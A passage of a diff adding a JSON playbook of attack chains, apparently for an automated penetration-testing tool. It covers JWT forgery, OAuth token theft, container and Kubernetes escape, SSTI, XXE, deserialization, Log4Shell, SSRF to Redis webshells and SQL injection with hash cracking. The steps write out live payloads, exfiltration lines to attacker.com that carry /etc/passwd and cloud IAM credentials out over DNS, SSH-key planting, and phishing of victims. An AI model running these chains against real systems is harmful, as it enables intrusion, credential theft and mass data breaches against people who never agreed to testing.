+          "order": 4,
+          "action": "Test RS256\u2192HS256: sign with public key as HMAC secret",
+          "tool_hint": "jwt_tool",
+          "success_criteria": "Server accepts HS256 token",
+          "invariant_check": "",
+          "negative_control": ""
+        },
+        {
+          "order": 5,
+          "action": "Forge admin claims: {\"role\":\"admin\",\"isAdmin\":true}",
+          "tool_hint": "jwt_tool",
+          "success_criteria": "Admin access granted",
+          "invariant_check": "",
+          "negative_control": ""
+        }
+      ],
+      "tools": []
+    },
+    {
+      "id": "oauth_redirect_bypass",
+      "name": "OAuth Redirect URI Bypass and Token Theft",
+      "triggers": [
+        "oauth",
+        "openid",
+        "authorize",
+        "redirect_uri",
+        "callback"
+      ],
+      "required_findings": [
+        "oauth",
+        "redirect"
+      ],
+      "severity": "CRITICAL",
+      "steps": [
+        {
+          "order": 1,
+          "action": "Identify OAuth flow: /authorize?client_id=X&redirect_uri=Y",
+          "tool_hint": "browser_devtools",
+          "success_criteria": "OAuth endpoint found",
+          "invariant_check": "",
+          "negative_control": ""
+        },
+        {
+          "order": 2,
+          "action": "Test open redirect: redirect_uri=https://attacker.com",
+          "tool_hint": "manual",
+          "success_criteria": "Redirect accepted",
+          "invariant_check": "",
+          "negative_control": ""
+        },
+        {
+          "order": 3,
+          "action": "Bypass allowlist: https://target.com.attacker.com or https://target.com@attacker.com",
+          "tool_hint": "manual",
+          "success_criteria": "Allowlist bypassed",
+          "invariant_check": "",
+          "negative_control": ""
+        },
+        {
+          "order": 4,
+          "action": "Craft malicious OAuth URL and send to victim",
+          "tool_hint": "manual",
+          "success_criteria": "Victim clicks link",
+          "invariant_check": "",
+          "negative_control": ""
+        },
+        {
+          "order": 5,
+          "action": "Capture authorization code from Referer header",
+          "tool_hint": "burp",
+          "success_criteria": "Auth code obtained",
+          "invariant_check": "",
+          "negative_control": ""
+        },
+        {
+          "order": 6,
+          "action": "Exchange code for access token",
+          "tool_hint": "curl",
+          "success_criteria": "Access token received",
+          "invariant_check": "",
+          "negative_control": ""
+        }
+      ],
+      "tools": []
+    },
+    {
+      "id": "docker_container_breakout",
+      "name": "Docker Container Breakout to Host Compromise",
+      "triggers": [
+        "docker",
+        "container",
+        "privileged",
+        "namespace"
+      ],
+      "required_findings": [
+        "docker",
+        "container"
+      ],
+      "severity": "CRITICAL",
+      "steps": [
+        {
+          "order": 1,
+          "action": "Confirm container access via RCE or exposed Docker socket",
+          "tool_hint": "manual",
+          "success_criteria": "Inside container confirmed",
+          "invariant_check": "",
+          "negative_control": ""
+        },
+        {
+          "order": 2,
+          "action": "Check for privileged flag: cat /proc/1/status | grep Cap",
+          "tool_hint": "manual",
+          "success_criteria": "CapSysAdmin or Privileged: true",
+          "invariant_check": "",
+          "negative_control": ""
+        },
+        {
+          "order": 3,
+          "action": "Mount host filesystem: mkdir /host && mount /dev/sda1 /host",
+          "tool_hint": "manual",
+          "success_criteria": "Host FS accessible",
+          "invariant_check": "",
+          "negative_control": ""
+        },
+        {
+          "order": 4,
+          "action": "Add SSH key to host: echo attacker_key >> /host/root/.ssh/authorized_keys",
+          "tool_hint": "manual",
+          "success_criteria": "SSH key planted",
+          "invariant_check": "",
+          "negative_control": ""
+        },
+        {
+          "order": 5,
+          "action": "SSH to host with planted key",
+          "tool_hint": "ssh",
+          "success_criteria": "Host access confirmed",
+          "invariant_check": "",
+          "negative_control": ""
+        }
+      ],
+      "tools": [
+        "chisel",
+        "linpeas"
+      ]
+    },
+    {
+      "id": "kubernetes_pod_escape",
+      "name": "Kubernetes Pod Escape to Cluster Compromise",
+      "triggers": [
+        "kubernetes",
+        "k8s",
+        "pod",
+        "service account",
+        "rbac"
+      ],
+      "required_findings": [
+        "kubernetes",
+        "pod"
+      ],
+      "severity": "CRITICAL",
+      "steps": [
+        {
+          "order": 1,
+          "action": "Access pod: kubectl exec or RCE via app vulnerability",
+          "tool_hint": "kubectl",
+          "success_criteria": "Inside pod confirmed",
+          "invariant_check": "",
+          "negative_control": ""
+        },
+        {
+          "order": 2,
+          "action": "Steal service account token: cat /var/run/secrets/kubernetes.io/serviceaccount/token",
+          "tool_hint": "manual",
+          "success_criteria": "JWT token obtained",
+          "invariant_check": "",
+          "negative_control": ""
+        },
+        {
+          "order": 3,
+          "action": "Enumerate RBAC permissions: kubectl auth can-i --list",
+          "tool_hint": "kubectl",
+          "success_criteria": "Permissions list obtained",
+          "invariant_check": "",
+          "negative_control": ""
+        },
+        {
+          "order": 4,
+          "action": "Create privileged pod or access secrets",
+          "tool_hint": "kubectl",
+          "success_criteria": "Privileged access confirmed",
+          "invariant_check": "",
+          "negative_control": ""
+        },
+        {
+          "order": 5,
+          "action": "Extract cluster secrets from etcd or Secrets API",
+          "tool_hint": "kubectl",
+          "success_criteria": "Secrets dumped",
+          "invariant_check": "",
+          "negative_control": ""
+        }
+      ],
+      "tools": []
+    },
+    {
+      "id": "ssti_to_full_rce",
+      "name": "SSTI to Full RCE",
+      "triggers": [
+        "ssti",
+        "template injection",
+        "49 in response",
+        "jinja",
+        "twig",
+        "freemarker"
+      ],
+      "required_findings": [
+        "template",
+        "ssti"
+      ],
+      "severity": "CRITICAL",
+      "steps": [
+        {
+          "order": 1,
+          "action": "Confirm SSTI: {{7*7}} returns 49 in response",
+          "tool_hint": "manual",
+          "success_criteria": "Math evaluated server-side",
+          "invariant_check": "",
+          "negative_control": ""
+        },
+        {
+          "order": 2,
+          "action": "Identify template engine: probe Jinja2, Twig, Freemarker payloads",
+          "tool_hint": "tplmap",
+          "success_criteria": "Engine identified",
+          "invariant_check": "",
+          "negative_control": ""
+        },
+        {
+          "order": 3,
+          "action": "Escalate to RCE: Jinja2 {{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
+          "tool_hint": "manual",
+          "success_criteria": "Command output returned",
+          "invariant_check": "",
+          "negative_control": ""
+        },
+        {
+          "order": 4,
+          "action": "Exfiltrate environment variables and secrets",
+          "tool_hint": "manual",
+          "success_criteria": "DB credentials, API keys obtained",
+          "invariant_check": "",
+          "negative_control": ""
+        }
+      ],
+      "tools": []
+    },
+    {
+      "id": "prototype_pollution_to_rce",
+      "name": "Prototype Pollution to RCE",
+      "triggers": [
+        "prototype pollution",
+        "__proto__",
+        "lodash",
+        "merge",
+        "nodejs"
+      ],
+      "required_findings": [
+        "prototype",
+        "nodejs"
+      ],
+      "severity": "CRITICAL",
+      "steps": [
+        {
+          "order": 1,
+          "action": "Confirm prototype pollution: POST {\"__proto__\":{\"isAdmin\":true}}",
+          "tool_hint": "manual",
+          "success_criteria": "Privilege escalation confirmed",
+          "invariant_check": "",
+          "negative_control": ""
+        },
+        {
+          "order": 2,
+          "action": "Identify merge library: lodash, deepmerge, jQuery extend",
+          "tool_hint": "source_analysis",
+          "success_criteria": "Vulnerable library found",
+          "invariant_check": "",
+          "negative_control": ""
+        },
+        {
+          "order": 3,
+          "action": "Pollute process.binding or spawnprototype for RCE",
+          "tool_hint": "manual",
+          "success_criteria": "Command execution gadget triggered",
+          "invariant_check": "",
+          "negative_control": ""
+        },
+        {
+          "order": 4,
+          "action": "Execute OS command via prototype chain",
+          "tool_hint": "manual",
+          "success_criteria": "id/whoami output returned",
+          "invariant_check": "",
+          "negative_control": ""
+        }
+      ],
+      "tools": [
+        "ppfuzz",
+        "curl"
+      ]
+    },
+    {
+      "id": "xxe_to_ssrf_and_file_read",
+      "name": "XXE to SSRF and File Read",
+      "triggers": [
+        "xxe",
+        "xml external entity",
+        "doctype",
+        "xml injection",
+        "svg upload"
+      ],
+      "required_findings": [
+        "xxe",
+        "xml"
+      ],
+      "severity": "CRITICAL",
+      "steps": [
+        {
+          "order": 1,
+          "action": "Confirm XXE: inject <!DOCTYPE x [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>",
+          "tool_hint": "manual",
+          "success_criteria": "/etc/passwd content returned",
+          "invariant_check": "",
+          "negative_control": ""
+        },
+        {
+          "order": 2,
+          "action": "Read sensitive files: /etc/passwd, /etc/shadow, ~/.ssh/id_rsa",
+          "tool_hint": "manual",
+          "success_criteria": "Credentials obtained",
+          "invariant_check": "",
+          "negative_control": ""
+        },
+        {
+          "order": 3,
+          "action": "SSRF via XXE: SYSTEM 'http://169.254.169.254/latest/meta-data/'",
+          "tool_hint": "manual",
+          "success_criteria": "Cloud metadata returned",
+          "invariant_check": "",
+          "negative_control": ""
+        },
+        {
+          "order": 4,
+          "action": "Internal port scan via XXE: http://192.168.1.1:22, :80, :443",
+          "tool_hint": "manual",
+          "success_criteria": "Internal services enumerated",
+          "invariant_check": "",
+          "negative_control": ""
+        }
+      ],
+      "tools": []
+    },
+    {
+      "id": "graphql_idor_to_data_theft",
+      "name": "GraphQL IDOR to Mass Data Theft",
+      "triggers": [
+        "graphql",
+        "gql",
+        "introspection",
+        "node(",
+        "apollo"
+      ],
+      "required_findings": [
+        "graphql",
+        "idor"
+      ],
+      "severity": "CRITICAL",
+      "steps": [
+        {
+          "order": 1,
+          "action": "Enable introspection: query { __schema { types { name } } }",
+          "tool_hint": "graphql_playground",
+          "success_criteria": "Schema dumped",
+          "invariant_check": "",
+          "negative_control": ""
+        },
+        {
+          "order": 2,
+          "action": "Identify node() or object query accepting ID parameter",
+          "tool_hint": "introspection",
+          "success_criteria": "Query signature found",
+          "invariant_check": "",
+          "negative_control": ""
+        },
+        {
+          "order": 3,
+          "action": "Test IDOR: query { node(id: \"gid://User/123\") { ...on User { email role } } }",
+          "tool_hint": "manual",
+          "success_criteria": "Cross-user data returned",
+          "invariant_check": "",
+          "negative_control": ""
+        },
+        {
+          "order": 4,
+          "action": "Batch enumerate all user IDs via script",
+          "tool_hint": "inql",
+          "success_criteria": "All user data extracted",
+          "invariant_check": "",
+          "negative_control": ""
+        },
+        {
+          "order": 5,
+          "action": "Exfiltrate sensitive fields: emails, roles, API keys",
+          "tool_hint": "manual",
+          "success_criteria": "Data breach confirmed",
+          "invariant_check": "",
+          "negative_control": ""
+        }
+      ],
+      "tools": []
+    },
+    {
+      "id": "deserialization_to_rce",
+      "name": "Insecure Deserialization to RCE",
+      "triggers": [
+        "deserializ",
+        "pickle",
+        "viewstate",
+        "java.io",
+        "marshal",
+        "phpobject"
+      ],
+      "required_findings": [
+        "deserializ",
+        "java"
+      ],
+      "severity": "CRITICAL",
+      "steps": [
+        {
+          "order": 1,
+          "action": "Identify deserialization: base64/rO0AB/PHPserialize in cookie/POST",
+          "tool_hint": "manual",
+          "success_criteria": "Serialized object confirmed",
+          "invariant_check": "",
+          "negative_control": ""
+        },
+        {
+          "order": 2,
+          "action": "Identify language/framework: Java (rO0AB), PHP (O:8:), Python (pickle)",
+          "tool_hint": "manual",
+          "success_criteria": "Technology identified",
+          "invariant_check": "",
+          "negative_control": ""
+        },
+        {
+          "order": 3,
+          "action": "Generate gadget payload: ysoserial CommonsCollections5 'nslookup attacker.com'",
+          "tool_hint": "ysoserial",
+          "success_criteria": "DNS callback received",
+          "invariant_check": "",
+          "negative_control": ""
+        },
+        {
+          "order": 4,
+          "action": "Upgrade to RCE: reverse shell payload",
+          "tool_hint": "ysoserial",
+          "success_criteria": "Shell received",
+          "invariant_check": "",
+          "negative_control": ""
+        }
+      ],
+      "tools": [
+        "ysoserial",
+        "phpggc"
+      ]
+    },
+    {
+      "id": "cache_poison_to_stored_xss",
+      "name": "Cache Poisoning to Stored XSS",
+      "triggers": [
+        "cache poisoning",
+        "web cache",
+        "cdn",
+        "varnish",
+        "unkeyed header"
+      ],
+      "required_findings": [
+        "cache",
+        "xss"
+      ],
+      "severity": "CRITICAL",
+      "steps": [
+        {
+          "order": 1,
+          "action": "Identify unkeyed header: X-Forwarded-Host, X-Original-URL",
+          "tool_hint": "param_miner",
+          "success_criteria": "Header reflected but not in cache key",
+          "invariant_check": "",
+          "negative_control": ""
+        },
+        {
+          "order": 2,
+          "action": "Inject XSS via unkeyed header: X-Forwarded-Host: <script>alert(1)</script>",
+          "tool_hint": "manual",
+          "success_criteria": "XSS reflected in response",
+          "invariant_check": "",
+          "negative_control": ""
+        },
+        {
+          "order": 3,
+          "action": "Poison cache: send request with unique cachebuster, verify stored",
+          "tool_hint": "manual",
+          "success_criteria": "XSS appears without malicious header",
+          "invariant_check": "",
+          "negative_control": ""
+        },
+        {
+          "order": 4,
+          "action": "Mass impact: all users visiting cached URL trigger XSS",
+          "tool_hint": "manual",
+          "success_criteria": "Victim session hijacked",
+          "invariant_check": "",
+          "negative_control": ""
+        }
+      ],
+      "tools": [
+        "dalfox",
+        "ffuf"
+      ]
+    },
+    {
+      "id": "http_smuggling_to_auth_bypass",
+      "name": "HTTP Request Smuggling to Auth Bypass",
+      "triggers": [
+        "http smuggling",
+        "request smuggling",
+        "cl.te",
+        "te.cl",
+        "desync"
+      ],
+      "required_findings": [
+        "smuggling",
+        "admin"
+      ],
+      "severity": "CRITICAL",
+      "steps": [
+        {
+          "order": 1,
+          "action": "Probe for CL.TE: send Content-Length: 6 + Transfer-Encoding: chunked",
+          "tool_hint": "smuggler",
+          "success_criteria": "Request queued (X appears in next response)",
+          "invariant_check": "",
+          "negative_control": ""
+        },
+        {
+          "order": 2,
+          "action": "Smuggle prefix to admin endpoint: GET /admin HTTP/1.1",
+          "tool_hint": "manual",
+          "success_criteria": "Admin response in subsequent request",
+          "invariant_check": "",
+          "negative_control": ""
+        },
+        {
+          "order": 3,
+          "action": "Bypass WAF: smuggle malicious request that frontend doesn't see",
+          "tool_hint": "manual",
+          "success_criteria": "WAF bypassed",
+          "invariant_check": "",
+          "negative_control": ""
+        },
+        {
+          "order": 4,
+          "action": "Access privileged functionality without authentication",
+          "tool_hint": "manual",
+          "success_criteria": "Admin action performed",
+          "invariant_check": "",
+          "negative_control": ""
+        }
+      ],
+      "tools": []
+    },
+    {
+      "id": "path_traversal_to_credential_theft",
+      "name": "Path Traversal to Credential Theft and Lateral Movement",
+      "triggers": [
+        "path traversal",
+        "directory traversal",
+        "lfi",
+        "../",
+        "etc/passwd"
+      ],
+      "required_findings": [
+        "traversal",
+        "path"
+      ],
+      "severity": "CRITICAL",
+      "steps": [
+        {
+          "order": 1,
+          "action": "Confirm LFI: ../../../../etc/passwd returns root:x:0:0",
+          "tool_hint": "manual",
+          "success_criteria": "File content visible",
+          "invariant_check": "",
+          "negative_control": ""
+        },
+        {
+          "order": 2,
+          "action": "Read application configs: .env, config.php, database.yml",
+          "tool_hint": "manual",
+          "success_criteria": "DB credentials obtained",
+          "invariant_check": "",
+          "negative_control": ""
+        },
+        {
+          "order": 3,
+          "action": "Read SSH keys: ~/.ssh/id_rsa, /root/.ssh/authorized_keys",
+          "tool_hint": "manual",
+          "success_criteria": "SSH key obtained",
+          "invariant_check": "",
+          "negative_control": ""
+        },
+        {
+          "order": 4,
+          "action": "SSH to internal server with stolen key",
+          "tool_hint": "ssh",
+          "success_criteria": "Internal access confirmed",
+          "invariant_check": "",
+          "negative_control": ""
+        }
+      ],
+      "tools": []
+    },
+    {
+      "id": "second_order_sqli",
+      "name": "Second-Order SQL Injection via Stored Input",
+      "triggers": [
+        "sql injection",
+        "stored sqli",
+        "second-order",
+        "profile",
+        "username"
+      ],
+      "required_findings": [
+        "sql injection",
+        "stored"
+      ],
+      "severity": "HIGH",
+      "steps": [
+        {
+          "order": 1,
+          "action": "Identify stored input: username, bio, comment, note field",
+          "tool_hint": "manual",
+          "success_criteria": "Input persisted in database",
+          "invariant_check": "",
+          "negative_control": ""
+        },
+        {
+          "order": 2,
+          "action": "Store SQLi payload: admin' UNION SELECT password FROM users--",
+          "tool_hint": "manual",
+          "success_criteria": "Payload stored without error",
+          "invariant_check": "",
+          "negative_control": ""
+        },
+        {
+          "order": 3,
+          "action": "Trigger execution: admin views profile/search results",
+          "tool_hint": "manual",
+          "success_criteria": "SQL error or data leakage",
+          "invariant_check": "",
+          "negative_control": ""
+        },
+        {
+          "order": 4,
+          "action": "Extract sensitive data via second-order injection",
+          "tool_hint": "manual",
+          "success_criteria": "Passwords/emails dumped",
+          "invariant_check": "",
+          "negative_control": ""
+        }
+      ],
+      "tools": []
+    },
+    {
+      "id": "mass_assignment_to_admin_takeover",
+      "name": "Mass Assignment to Admin Takeover",
+      "triggers": [
+        "mass assignment",
+        "auto-binding",
+        "role",
+        "admin",
+        "is_admin"
+      ],
+      "required_findings": [
+        "mass assignment",
+        "admin"
+      ],
+      "severity": "CRITICAL",
+      "steps": [
+        {
+          "order": 1,
+          "action": "Identify mass assignment: PUT /api/profile with extra fields",
+          "tool_hint": "manual",
+          "success_criteria": "Extra fields accepted",
+          "invariant_check": "",
+          "negative_control": ""
+        },
+        {
+          "order": 2,
+          "action": "Add role=admin: {\"role\":\"admin\",\"isStaff\":true}",
+          "tool_hint": "manual",
+          "success_criteria": "Response includes admin role",
+          "invariant_check": "",
+          "negative_control": ""
+        },
+        {
+          "order": 3,
+          "action": "Verify admin access: access /admin panel",
+          "tool_hint": "browser",
+          "success_criteria": "Admin panel accessible",
+          "invariant_check": "",
+          "negative_control": ""
+        },
+        {
+          "order": 4,
+          "action": "Escalate privileges: create users, delete data, export DB",
+          "tool_hint": "manual",
+          "success_criteria": "Full admin control",
+          "invariant_check": "",
+          "negative_control": ""
+        }
+      ],
+      "tools": []
+    },
+    {
+      "id": "api_key_leak_to_account_takeover",
+      "name": "API Key Leakage to Full Account Takeover",
+      "triggers": [
+        "api_key",
+        "apikey",
+        "x-api-key",
+        "secret",
+        "token exposed"
+      ],
+      "required_findings": [
+        "api_key",
+        "apikey"
+      ],
+      "severity": "CRITICAL",
+      "steps": [
+        {
+          "order": 1,
+          "action": "Find API key: grep JS files for api_key, secret, token",
+          "tool_hint": "subjs + grep",
+          "success_criteria": "Key found in main.js",
+          "invariant_check": "",
+          "negative_control": ""
+        },
+        {
+          "order": 2,
+          "action": "Test key: use in Authorization header for API call",
+          "tool_hint": "curl",
+          "success_criteria": "API responds with data",
+          "invariant_check": "",
+          "negative_control": ""
+        },
+        {
+          "order": 3,
+          "action": "Enumerate permissions: what endpoints accept this key?",
+          "tool_hint": "manual",
+          "success_criteria": "Scope determined",
+          "invariant_check": "",
+          "negative_control": ""
+        },
+        {
+          "order": 4,
+          "action": "Access all data: users, orders, payments via API",
+          "tool_hint": "curl",
+          "success_criteria": "Full data breach",
+          "invariant_check": "",
+          "negative_control": ""
+        }
+      ],
+      "tools": [
+        "trufflehog",
+        "curl"
+      ]
+    },
+    {
+      "id": "spring_actuator_to_jmx_rce",
+      "name": "Spring Boot Actuator to JMX RCE",
+      "triggers": [
+        "spring boot",
+        "actuator",
+        "jolokia",
+        "jmx",
+        "/actuator"
+      ],
+      "required_findings": [
+        "actuator",
+        "spring"
+      ],
+      "severity": "CRITICAL",
+      "steps": [
+        {
+          "order": 1,
+          "action": "Enumerate actuator endpoints: GET /actuator, /actuator/jolokia",
+          "tool_hint": "manual",
+          "success_criteria": "Jolokia endpoint accessible",
+          "invariant_check": "",
+          "negative_control": ""
+        },
+        {
+          "order": 2,
+          "action": "List MBeans: GET /actuator/jolokia/list",
+          "tool_hint": "manual",
+          "success_criteria": "MBean list obtained",
+          "invariant_check": "",
+          "negative_control": ""
+        },
+        {
+          "order": 3,
+          "action": "Execute via MBeanServer: createMBean with malicious class",
+          "tool_hint": "manual",
+          "success_criteria": "Command executed",
+          "invariant_check": "",
+          "negative_control": ""
+        },
+        {
+          "order": 4,
+          "action": "Alternative: invoke Logback JNDI injection",
+          "tool_hint": "manual",
+          "success_criteria": "RCE confirmed",
+          "invariant_check": "",
+          "negative_control": ""
+        }
+      ],
+      "tools": []
+    },
+    {
+      "id": "cors_misconfig_to_session_theft",
+      "name": "CORS Misconfiguration to Session Token Theft",
+      "triggers": [
+        "cors",
+        "access-control",
+        "cross-origin",
+        "credentials"
+      ],
+      "required_findings": [
+        "cors",
+        "session"
+      ],
+      "severity": "HIGH",
+      "steps": [
+        {
+          "order": 1,
+          "action": "Test CORS: send Origin: https://evil.com, check Access-Control-Allow-Origin",
+          "tool_hint": "manual",
+          "success_criteria": "Origin reflected with Credentials: true",
+          "invariant_check": "",
+          "negative_control": ""
+        },
+        {
+          "order": 2,
+          "action": "Craft malicious page: XHR to /api/user with credentials:include",
+          "tool_hint": "manual",
+          "success_criteria": "Response readable via JS",
+          "invariant_check": "",
+          "negative_control": ""
+        },
+        {
+          "order": 3,
+          "action": "Host phishing page, send to victim",
+          "tool_hint": "manual",
+          "success_criteria": "Victim visits page",
+          "invariant_check": "",
+          "negative_control": ""
+        },
+        {
+          "order": 4,
+          "action": "Steal session token from response JSON",
+          "tool_hint": "javascript",
+          "success_criteria": "Token exfiltrated",
+          "invariant_check": "",
+          "negative_control": ""
+        }
+      ],
+      "tools": [
+        "curl",
+        "nikto"
+      ]
+    },
+    {
+      "id": "subdomain_takeover_to_cookie_theft",
+      "name": "Subdomain Takeover to Cookie Theft",
+      "triggers": [
+        "subdomain takeover",
+        "cname",
+        "dangling",
+        "s3",
+        "github pages"
+      ],
+      "required_findings": [
+        "subdomain",
+        "cname"
+      ],
+      "severity": "HIGH",
+      "steps": [
+        {
+          "order": 1,
+          "action": "Find dangling CNAME: shop.target.com \u2192 shops.myshopify.com (404)",
+          "tool_hint": "subzy",
+          "success_criteria": "Claimable subdomain found",
+          "invariant_check": "",
+          "negative_control": ""
+        },
+        {
+          "order": 2,
+          "action": "Register and claim subdomain on provider (Shopify, S3, GitHub)",
+          "tool_hint": "manual",
+          "success_criteria": "Subdomain under attacker control",
+          "invariant_check": "",
+          "negative_control": ""
+        },
+        {
+          "order": 3,
+          "action": "Set cookie on *.target.com via malicious JS",
+          "tool_hint": "javascript",
+          "success_criteria": "Cookie set on parent domain",
+          "invariant_check": "",
+          "negative_control": ""
+        },
+        {
+          "order": 4,
+          "action": "Steal session when victim visits main domain",
+          "tool_hint": "javascript",
+          "success_criteria": "Session cookie captured",
+          "invariant_check": "",
+          "negative_control": ""
+        }
+      ],
+      "tools": []
+    },
+    {
+      "id": "ssrf_to_redis_rce",
+      "name": "SSRF to Redis RCE via Gopher",
+      "triggers": [
+        "ssrf",
+        "redis",
+        "gopher",
+        "internal service"
+      ],
+      "required_findings": [
+        "ssrf",
+        "redis"
+      ],
+      "severity": "CRITICAL",
+      "steps": [
+        {
+          "order": 1,
+          "action": "Confirm SSRF: callback to attacker DNS",
+          "tool_hint": "interactsh",
+          "success_criteria": "DNS received",
+          "invariant_check": "",
+          "negative_control": ""
+        },
+        {
+          "order": 2,
+          "action": "Probe internal Redis: gopher://127.0.0.1:6379/_PING",
+          "tool_hint": "manual",
+          "success_criteria": "+PONG response",
+          "invariant_check": "",
+          "negative_control": ""
+        },
+        {
+          "order": 3,
+          "action": "Write webshell: gopher://127.0.0.1:6379/_CONFIG%20SET%20dir%20/var/www/html",
+          "tool_hint": "manual",
+          "success_criteria": "Webshell written",
+          "invariant_check": "",
+          "negative_control": ""
+        },
+        {
+          "order": 4,
+          "action": "Access webshell via HTTP",
+          "tool_hint": "browser",
+          "success_criteria": "RCE confirmed",
+          "invariant_check": "",
+          "negative_control": ""
+        }
+      ],
+      "tools": []
+    },
+    {
+      "id": "default_creds_to_internal_pivot",
+      "name": "Default Credentials to Internal Network Pivot",
+      "triggers": [
+        "default credentials",
+        "admin/admin",
+        "management console",
+        "panel"
+      ],
+      "required_findings": [
+        "admin",
+        "default"
+      ],
+      "severity": "HIGH",
+      "steps": [
+        {
+          "order": 1,
+          "action": "Identify admin panel: /admin, /manager, /console",
+          "tool_hint": "nuclei",
+          "success_criteria": "Login page found",
+          "invariant_check": "",
+          "negative_control": ""
+        },
+        {
+          "order": 2,
+          "action": "Test default creds: admin/admin, admin/password, tomcat/tomcat",
+          "tool_hint": "hydra",
+          "success_criteria": "Login successful",
+          "invariant_check": "",
+          "negative_control": ""
+        },
+        {
+          "order": 3,
+          "action": "Access management features: deploy, execute, config",
+          "tool_hint": "manual",
+          "success_criteria": "Privileged action available",
+          "invariant_check": "",
+          "negative_control": ""
+        },
+        {
+          "order": 4,
+          "action": "Deploy malicious app or execute system command",
+          "tool_hint": "manual",
+          "success_criteria": "RCE confirmed",
+          "invariant_check": "",
+          "negative_control": ""
+        }
+      ],
+      "tools": [
+        "hydra",
+        "netexec"
+      ]
+    },
+    {
+      "id": "open_redirect_to_oauth_theft",
+      "name": "Open Redirect to OAuth Token Theft",
+      "triggers": [
+        "open redirect",
+        "oauth",
+        "redirect_uri",
+        "return_url"
+      ],
+      "required_findings": [
+        "redirect",
+        "oauth"
+      ],
+      "severity": "HIGH",
+      "steps": [
+        {
+          "order": 1,
+          "action": "Find open redirect: /redirect?url=https://attacker.com",
+          "tool_hint": "manual",
+          "success_criteria": "Redirect accepted",
+          "invariant_check": "",
+          "negative_control": ""
+        },
+        {
+          "order": 2,
+          "action": "Craft OAuth URL: /authorize?client_id=X&redirect_uri=https://target.com/redirect?url=https://attacker.com",
+          "tool_hint": "manual",
+          "success_criteria": "OAuth flow initiated",
+          "invariant_check": "",
+          "negative_control": ""
+        },
+        {
+          "order": 3,
+          "action": "Victim authorizes, redirected to attacker.com with code",
+          "tool_hint": "manual",
+          "success_criteria": "Auth code in Referer",
+          "invariant_check": "",
+          "negative_control": ""
+        },
+        {
+          "order": 4,
+          "action": "Exchange code for access token",
+          "tool_hint": "curl",
+          "success_criteria": "Token obtained",
+          "invariant_check": "",
+          "negative_control": ""
+        }
+      ],
+      "tools": []
+    },
+    {
+      "id": "sqli_to_hash_dump_and_crack",
+      "name": "SQLi to Password Hash Dump and Crack",
+      "triggers": [
+        "sql injection",
+        "password hash",
+        "users table",
+        "md5",
+        "bcrypt"
+      ],
+      "required_findings": [
+        "sql injection",
+        "hash"
+      ],
+      "severity": "HIGH",
+      "steps": [
+        {
+          "order": 1,
+          "action": "Confirm SQLi and extract database name",
+          "tool_hint": "sqlmap",
+          "success_criteria": "Database name obtained",
+          "invariant_check": "",
+          "negative_control": ""
+        },
+        {
+          "order": 2,
+          "action": "Dump users table: UNION SELECT email, password FROM users",
+          "tool_hint": "sqlmap",
+          "success_criteria": "Hashes obtained",
+          "invariant_check": "",
+          "negative_control": ""
+        },
+        {
+          "order": 3,
+          "action": "Identify hash type: MD5, SHA256, bcrypt",
+          "tool_hint": "hashid",
+          "success_criteria": "Hash type determined",
+          "invariant_check": "",
+          "negative_control": ""
+        },
+        {
+          "order": 4,
+          "action": "Crack with hashcat: -m 0 (MD5), -m 100 (SHA1), -m 3200 (bcrypt)",
+          "tool_hint": "hashcat",
+          "success_criteria": "Plaintext passwords recovered",
+          "invariant_check": "",
+          "negative_control": ""
+        }
+      ],
+      "tools": []
+    },
+    {
+      "id": "log4shell_jndi_rce",
+      "name": "Log4Shell JNDI Injection to RCE",
+      "triggers": [
+        "log4j",
+        "log4shell",
+        "jndi",
+        "java",
+        "ldap injection"
+      ],
+      "required_findings": [
+        "log4j",
+        "java"
+      ],
+      "severity": "CRITICAL",
+      "steps": [
+        {
+          "order": 1,
+          "action": "Identify Java app with Log4j (User-Agent logging, error logs)",
+          "tool_hint": "manual",
+          "success_criteria": "Log4j confirmed",
+          "invariant_check": "",
+          "negative_control": ""
+        },
+        {
+          "order": 2,
+          "action": "Inject JNDI: ${jndi:ldap://attacker.com/a}",
+          "tool_hint": "manual",
+          "success_criteria": "LDAP callback received",
+          "invariant_check": "",
+          "negative_control": ""
+        },
+        {
+          "order": 3,
+          "action": "Host malicious LDAP server returning Exploit.class",
+          "tool_hint": "rogue_jndi",
+          "success_criteria": "Class loaded on target",
+          "invariant_check": "",
+          "negative_control": ""
+        },
+        {
+          "order": 4,
+          "action": "Execute payload: reverse shell or command",
+          "tool_hint": "manual",
+          "success_criteria": "RCE confirmed",
+          "invariant_check": "",
+          "negative_control": ""
+        }
+      ],
+      "tools": []
+    },
+    {
+      "id": "blind_ssrf_to_oob_exfil",
+      "name": "Blind SSRF to OOB Data Exfiltration",
+      "triggers": [
+        "ssrf",
+        "blind ssrf",
+        "oob",
+        "dns callback"
+      ],
+      "required_findings": [
+        "ssrf",
+        "blind"
+      ],
+      "severity": "HIGH",
+      "steps": [
+        {
+          "order": 1,
+          "action": "Confirm blind SSRF: DNS callback to interactsh",
+          "tool_hint": "interactsh",
+          "success_criteria": "DNS received",
+          "invariant_check": "",
+          "negative_control": ""
+        },
+        {
+          "order": 2,
+          "action": "Exfil via DNS: http://$(whoami|base64).attacker.com",
+          "tool_hint": "manual",
+          "success_criteria": "Subdomain decoded to command output",
+          "invariant_check": "",
+          "negative_control": ""
+        },
+        {
+          "order": 3,
+          "action": "Read internal file: http://$(cat /etc/passwd|base64).attacker.com",
+          "tool_hint": "manual",
+          "success_criteria": "File content exfiltrated",
+          "invariant_check": "",
+          "negative_control": ""
+        },
+        {
+          "order": 4,
+          "action": "Extract cloud metadata: http://$(curl 169.254.169.254/latest/meta-data/iam|base64).attacker.com",
+          "tool_hint": "manual",
+          "success_criteria": "IAM credentials obtained",
+          "invariant_check": "",
+          "negative_control": ""
+        }
+      ],
+      "tools": [
+        "interactsh",
+        "ssrfmap"
+      ]
+    },
+    {
+      "id": "graphql_batching_to_credential_stuffing",
+      "name": "GraphQL Batching to Credential Stuffing",
+      "triggers": [
+        "graphql",
+        "batching",
+        "login mutation",
+        "rate limit bypass"
+      ],
+      "required_findings": [
+        "graphql",
+        "login"
+      ],
+      "severity": "HIGH",
+      "steps": [
+        {
+          "order": 1,
+          "action": "Identify login mutation: mutation { login(email:, password:) }",
+          "tool_hint": "introspection",
+          "success_criteria": "Mutation signature found",
+          "invariant_check": "",
+          "negative_control": ""
+        },
+        {
+          "order": 2,
+          "action": "Craft batch request: [{\"query\":\"mutation{login(e:'a',p:'x')}\"}, ...] x1000",
+          "tool_hint": "manual",
+          "success_criteria": "All mutations processed",
+          "invariant_check": "",
+          "negative_control": ""
+        },
